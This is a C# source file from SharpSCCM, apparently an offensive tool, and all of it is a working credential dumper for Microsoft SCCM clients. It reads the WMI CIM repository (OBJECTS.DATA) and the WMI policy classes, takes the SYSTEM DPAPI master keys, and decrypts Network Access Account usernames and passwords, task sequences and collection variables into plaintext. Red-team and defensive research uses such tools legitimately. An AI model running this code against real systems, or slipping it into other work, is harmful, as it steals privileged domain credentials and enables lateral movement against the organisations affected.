using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using System.Text;
using System.Text.RegularExpressions;

namespace SharpSCCM
{
    public class Credentials
    {
        public static void LocalSecretsDisk(bool reg)
        {
            // Thanks to @guervild on GitHub for contributing this code to SharpDPAPI
            Console.WriteLine($"[+] Retrieving policy secret blobs from CIM repository\r\n");

            string fileData = "";
            MemoryStream ms = new MemoryStream();

            // Path of the CIM repository
            string path = "";
            if (!Environment.Is64BitProcess)
            {
                path = $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\Sysnative\\Wbem\\Repository\\OBJECTS.DATA";
            }
            else
            {
                path = $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\System32\\Wbem\\Repository\\OBJECTS.DATA";
            }

            if (File.Exists(path))
            {
                using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                using (var sr = new StreamReader(fs, Encoding.Default))
                {
                    fileData = sr.ReadToEnd();
                }

                //Regex regexData = new Regex(@"<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>.*<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
                Regex regexData = new Regex(@"<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
                var matchesData = regexData.Matches(fileData);

                if (matchesData.Count <= 0)
                {
                    Console.WriteLine("\r\n[!] No policy secrets found.");
                }

                if (Helpers.IsHighIntegrity())
                {
                    Dictionary<string, string> masterkeys;
                    masterkeys = Dpapi.TriageSystemMasterKeys(reg);
 
                    Console.WriteLine("\r\n[+] SYSTEM master key cache:");
                    foreach (KeyValuePair<string, string> kvp in masterkeys)
                    {
                        Console.WriteLine("    {0}:{1}", kvp.Key, kvp.Value);
                    }

                    Console.WriteLine("\r\n[+] Triaging SCCM policy secrets from CIM repository\r\n");
                    for (int index = 0; index < matchesData.Count; index++)
                    {

                        for (int idxGroup = 1; idxGroup < matchesData[index].Groups.Count; idxGroup++)
                        {
                            try
                            {
                                string secretPlaintext = "";
                                secretPlaintext = Dpapi.Execute(matchesData[index].Groups[idxGroup].Value, masterkeys);
                                Console.WriteLine("     Plaintext secret: {0}", secretPlaintext);
                                Console.WriteLine();
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                                Console.WriteLine(e.ToString());
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("\r\n[!] You must be elevated to retrieve masterkeys.\r\n");
                }
            }
            else
            {
                Console.WriteLine("\r\n[!] OBJECTS.DATA does not exist or is not readable.\r\n");
            }
        }

        public static void LocalCollectionVariablesWmi(bool reg)
        {
            if (Helpers.IsHighIntegrity())
            {
                Console.WriteLine($"[*] Retrieving collection variable blobs via WMI");
                ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("127.0.0.1", "root\\ccm\\policy\\Machine\\ActualConfig");
                Console.WriteLine();
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT * FROM CCM_CollectionVariable"));
                ManagementObjectCollection collectionVariables = searcher.Get();
                if (collectionVariables.Count > 0)
                {
                    foreach (ManagementObject collectionVariable in collectionVariables)
                    {
                        string collectionVariableName = collectionVariable["Name"].ToString();
                        string protectedCollectionVariableValue = collectionVariable["Value"].ToString().Split('[')[2].Split(']')[0];
                        Dictionary<string, string> masterkeys;
                        masterkeys = Dpapi.TriageSystemMasterKeys(reg);

                        Console.WriteLine("\r\n[*] SYSTEM master key cache:");
                        foreach (KeyValuePair<string, string> kvp in masterkeys)
                        {
                            Console.WriteLine("    {0}:{1}", kvp.Key, kvp.Value);
                        }
                        Console.WriteLine("\r\n[*] Triaging collection variables\r\n");
                        try
                        {
                            string plaintextCollectionVariableValue = Dpapi.Execute(protectedCollectionVariableValue, masterkeys);
                            Console.WriteLine("     Collection variable name: {0}", collectionVariableName);
                            Console.WriteLine("              Plaintext value: {0}\n", plaintextCollectionVariableValue);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                            Console.WriteLine(e.ToString());
                        }
                    }
                }
                else
                {
                    Console.WriteLine($"[+] Found 0 instances of CCM_CollectionVariable.\n");
                }
            }
            else
            {
                Console.WriteLine("[!] SharpSCCM must be run elevated to retrieve the NAA blobs via WMI.\n");
            }
        }

        public static void LocalNetworkAccessAccountsWmi(bool reg)
        {
            if (Helpers.IsHighIntegrity())
            {
                Console.WriteLine($"[*] Retrieving Network Access Account blobs via WMI\n");
                ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("127.0.0.1", "root\\ccm\\policy\\Machine\\ActualConfig");
                Console.WriteLine();
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
                ManagementObjectCollection accounts = searcher.Get();
                if (accounts.Count > 0)
                {
                    foreach (ManagementObject account in accounts)
                    {
                        string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
                        string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];

                        byte[] protectedUsernameBytes = Helpers.StringToByteArray(protectedUsername);
                        int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
                        Array.Resize(ref protectedUsernameBytes, length);
                        Dictionary<string, string> masterkeys;
                        masterkeys = Dpapi.TriageSystemMasterKeys(reg);
                        Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");

                        foreach (KeyValuePair<string, string> kvp in masterkeys)
                        {
                            Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                        }
                        Console.WriteLine();

                        try
                        {
                            string username = Dpapi.Execute(protectedUsername, masterkeys);
                            string password = Dpapi.Execute(protectedPassword, masterkeys);

                            if (username.StartsWith("00 00 0E 0E 0E") || password.StartsWith("00 00 0E 0E 0E"))
                            {
                                Console.WriteLine("\r\n[!] SCCM is configured to use the client's machine account instead of NAA\r\n");
                            }
                            else
                            {
                                Console.WriteLine("\r\n[*] Triaging Network Access Account Credentials\r\n");
                                Console.WriteLine("     Plaintext NAA Username         : {0}", username);
                                Console.WriteLine("     Plaintext NAA Password         : {0}\n", password);
                            }
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                            Console.WriteLine(e.ToString());
                        }
                    }
                }
                else
                {
                    Console.WriteLine($"[+] Found 0 instances of CCM_NetworkAccessAccount.\n");
                    Console.WriteLine($"[+] \n");
                    Console.WriteLine($"[+] This could mean one of three things:\n");
                    Console.WriteLine($"[+]    1. The SCCM environment does not have a Network Access Account configured\n");
                    Console.WriteLine($"[+]    2. This host is not an SCCM client (and never has been)\n");
                    Console.WriteLine($"[+]    3. This host is no longer an SCCM client (but used to be)\n");
                    Console.WriteLine($"[+] You can attempt running 'SharpSCCM local naa disk' to retrieve NAA credentials from machines\n");
                    Console.WriteLine($"[+] that used to be SCCM clients but have since had the client uninstalled.");
                }
            }
            else
            {
                Console.WriteLine("[!] SharpSCCM must be run elevated to retrieve the NAA blobs via WMI.\n");
            }
        }

        public static void LocalTaskSequencesWmi(bool reg)
        {
            if (Helpers.IsHighIntegrity())
            {
                Console.WriteLine($"[*] Retrieving task sequence blobs via WMI");
                ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("127.0.0.1", "root\\ccm\\policy\\Machine\\ActualConfig");
                Console.WriteLine();
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT * FROM CCM_TaskSequence"));
                ManagementObjectCollection taskSequences = searcher.Get();
                if (taskSequences.Count > 0)
                {
                    foreach (ManagementObject taskSequence in taskSequences)
                    {
                        string protectedTaskSequenceValue = taskSequence["TS_Sequence"].ToString().Split('[')[2].Split(']')[0];
                        Dictionary<string, string> masterkeys;
                        masterkeys = Dpapi.TriageSystemMasterKeys(reg);

                        Console.WriteLine("\r\n[*] SYSTEM master key cache:");
                        foreach (KeyValuePair<string, string> kvp in masterkeys)
                        {
                            Console.WriteLine("    {0}:{1}", kvp.Key, kvp.Value);
                        }
                        Console.WriteLine("\r\n[*] Triaging task sequences\r\n");
                        try
                        {
                            string plaintextTaskSequenceValue = Dpapi.Execute(protectedTaskSequenceValue, masterkeys);
                            Console.WriteLine("        Plaintext task sequence: {0}\n", plaintextTaskSequenceValue);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                            Console.WriteLine(e.ToString());
                        }
                    }
                }
                else
                {
                    Console.WriteLine($"[+] Found 0 instances of CCM_CollectionVariable.\n");
                }
            }
            else
            {
                Console.WriteLine("[!] SharpSCCM must be run elevated to retrieve the NAA blobs via WMI.\n");
            }
        }

        public static void LocalSecretsWmiA(bool reg)
        {
            LocalNetworkAccessAccountsWmi(reg);
            LocalTaskSequencesWmi(reg);
            LocalCollectionVariablesWmi(reg);
        }

        public static void LocalSecretsWmi(bool reg)
        {
            if (Helpers.IsHighIntegrity())
            {
                ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("127.0.0.1", "root\\ccm\\policy\\Machine\\ActualConfig");
                Console.WriteLine($"[*] Retrieving network access account blobs via WMI");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
                ManagementObjectCollection networkAccessAccounts = searcher.Get();
                Console.WriteLine($"[*] Retrieving task sequence blobs via WMI");
                searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT * FROM CCM_TaskSequence"));
                ManagementObjectCollection taskSequences = searcher.Get();
                Console.WriteLine($"[*] Retrieving collection variable blobs via WMI");
                searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT * FROM CCM_CollectionVariable"));
                ManagementObjectCollection collectionVariables = searcher.Get();

                if (networkAccessAccounts.Count > 0 || taskSequences.Count > 0 || collectionVariables.Count > 0)
                {
                    Dictionary<string, string> masterkeys;
                    masterkeys = Dpapi.TriageSystemMasterKeys(reg);

                    Console.WriteLine("\r\n[*] SYSTEM master key cache:");
                    foreach (KeyValuePair<string, string> kvp in masterkeys)
                    {
                        Console.WriteLine("    {0}:{1}", kvp.Key, kvp.Value);
                    }

                    if (networkAccessAccounts.Count > 0)
                    {
                        Console.WriteLine("\r\n[*] Triaging network access account Credentials\r\n");
                        foreach (ManagementObject account in networkAccessAccounts)
                        {
                            string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
                            string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];
                            byte[] protectedUsernameBytes = Helpers.StringToByteArray(protectedUsername);
                            int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
                            Array.Resize(ref protectedUsernameBytes, length);

                            try
                            {
                                string username = Dpapi.Execute(protectedUsername, masterkeys);
                                string password = Dpapi.Execute(protectedPassword, masterkeys);

                                if (username.StartsWith("00 00 0E 0E 0E") || password.StartsWith("00 00 0E 0E 0E"))
                                {
                                    Console.WriteLine("\r\n[!] SCCM is configured to use the client's machine account instead of NAA\r\n");
                                }
                                else
                                {
                                    Console.WriteLine("     Plaintext NAA Username         : {0}", username);
                                    Console.WriteLine("     Plaintext NAA Password         : {0}\n", password);
                                }
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                                Console.WriteLine(e.ToString());
                            }
                        }
                    }

                    if (taskSequences.Count > 0)
                    {
                        Console.WriteLine("\r\n[*] Triaging task sequences\r\n");
                        foreach (ManagementObject taskSequence in taskSequences)
                        {
                            string protectedTaskSequenceValue = taskSequence["TS_Sequence"].ToString().Split('[')[2].Split(']')[0];
                            try
                            {
                                string plaintextTaskSequenceValue = Dpapi.Execute(protectedTaskSequenceValue, masterkeys);
                                Console.WriteLine("        Plaintext task sequence: {0}\n", plaintextTaskSequenceValue);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                                Console.WriteLine(e.ToString());
                            }
                        }
                    }                  
                    
                    if (collectionVariables.Count > 0)
                    {
                        Console.WriteLine("\r\n[*] Triaging collection variables\r\n");
                        foreach (ManagementObject collectionVariable in collectionVariables)
                        {
                            string collectionVariableName = collectionVariable["Name"].ToString();
                            string protectedCollectionVariableValue = collectionVariable["Value"].ToString().Split('[')[2].Split(']')[0];
                            try
                            {
                                string plaintextCollectionVariableValue = Dpapi.Execute(protectedCollectionVariableValue, masterkeys);
                                Console.WriteLine("     Collection variable name: {0}", collectionVariableName);
                                Console.WriteLine("              Plaintext value: {0}\n", plaintextCollectionVariableValue);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                                Console.WriteLine(e.ToString());
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine($"[+] Found 0 instances of policy secrets.\n");
                }
            }
            else
            {
                Console.WriteLine("[!] SharpSCCM must be run elevated to retrieve the NAA blobs via WMI.\n");
            }
        }
    }
}
